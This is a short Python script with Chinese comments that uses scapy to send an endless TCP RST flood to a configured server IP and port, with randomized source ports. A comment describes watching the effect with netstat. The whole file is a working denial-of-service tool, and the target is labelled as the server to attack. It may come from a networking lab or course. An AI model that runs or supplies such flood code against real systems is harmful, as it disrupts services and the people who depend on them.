from scapy.all import IP, TCP, send
import random
import internet_info
#可在終端機用指令觀察效果:netstat -an | findstr ":8080" | findstr SYN_RECEIVED | measure

#setting
my_ip = internet_info.my_IP #獲取本機IP
target_ip ="203.0.113.123" #要攻擊的server IP
target_port = 63212 #要攻擊的server port
# ############################################################

print(f"Sending TCP RST flood to {target_ip}:{target_port}...")

while True:
    ip_layer = IP(src=my_ip, dst=target_ip) #如果本機IP傳到本機IP，可能不會通過網卡
    tcp_layer = TCP(
        sport=random.randint(63000,63020),  
        dport=target_port, 
        flags="R",
    )
    payload=0 
    packet = ip_layer / tcp_layer/random._urandom(payload)
    send(packet, verbose=True)
